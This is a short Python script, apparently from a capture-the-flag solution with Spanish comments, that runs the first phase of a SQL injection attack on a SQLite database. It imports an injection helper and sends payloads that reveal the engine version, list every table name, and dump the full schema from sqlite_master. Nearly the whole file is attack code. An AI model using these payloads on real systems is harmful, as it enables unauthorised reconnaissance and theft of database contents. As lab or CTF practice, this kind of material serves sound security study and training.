#!/usr/bin/env python3
"""Fase 1: motor, tablas y esquema (sin comas en las expresiones)."""
import sys

sys.path.insert(0, "/mnt/c/Users/shapl/OneDrive - dipreca.cl/Agentes IA/AUDITORIA_IA_V2/ctf/feriapersa/solucion")
from sqli import valor  # noqa: E402

pruebas = [
    ("version sqlite", "sqlite_version()"),
    ("tablas", "(SELECT group_concat(name) FROM sqlite_master WHERE type='table')"),
    ("esquema", "(SELECT group_concat(sql) FROM sqlite_master)"),
]

for nombre, expr in pruebas:
    print(f"### {nombre}")
    print("   ", valor(expr)[:2000])
    print()
